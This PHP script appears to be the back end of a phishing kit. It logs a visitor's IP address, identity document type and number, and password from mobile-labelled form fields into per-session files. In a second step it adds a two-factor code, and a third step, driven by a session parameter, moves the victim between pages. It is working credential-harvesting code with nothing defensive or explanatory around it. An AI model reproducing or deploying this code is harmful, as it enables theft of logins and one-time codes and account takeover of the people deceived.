<?php
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
      $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
      $ip = $_SERVER['REMOTE_ADDR'];
  }
  $sessionID=sha1($ip.date("dMY"));

  if($_GET["t"] == "1"){
    $myfile = fopen("sessions/".$sessionID.".json", "w") or die("Unable to open file!");
    $read = json_decode(file_get_contents("sessions/".$sessionID.".json"));
    $txt = '{"ip": "'.$ip.'", "sessionID": "'.$sessionID.'", "currentPage": "2.html"}';
    fwrite($myfile, $txt);

    $myfile = fopen("logs/".$sessionID.".txt", "w") or die("Unable to open file!");
    $txt = "Document: ".$_GET["docTypeNoMovil"]."\nDocument Number: ".$_GET["docNumberMovil"]."\nPassword: ".$_GET["passwordMovil"];
    fwrite($myfile, $txt);

    fclose($myfile);
  }
  else {
    if($_GET["t"] == "2"){
      $read = file_get_contents("logs/".$sessionID.".txt");
      $myfile = fopen("logs/".$sessionID.".txt", "w") or die("Unable to open file!");
      $txt = $read."\n2FA Code: ".$_GET["code"];
      fwrite($myfile, $txt);
      fclose($myfile);
    }
    else {
      if($_GET["t"] == "3"){
        $myfile = fopen("sessions/".$_GET['session'].".json", "w") or die("Unable to open file!");
        $read = json_decode(file_get_contents("sessions/".$_GET['session'].".json"));
        $txt = '{"ip": "'.$ip.'", "sessionID": "'.$_GET['session'].'", "currentPage": "4.html"}';
        fwrite($myfile, $txt);
        fclose($myfile);
        echo "<script>window.close();</script>";
      }
    }
  }
?>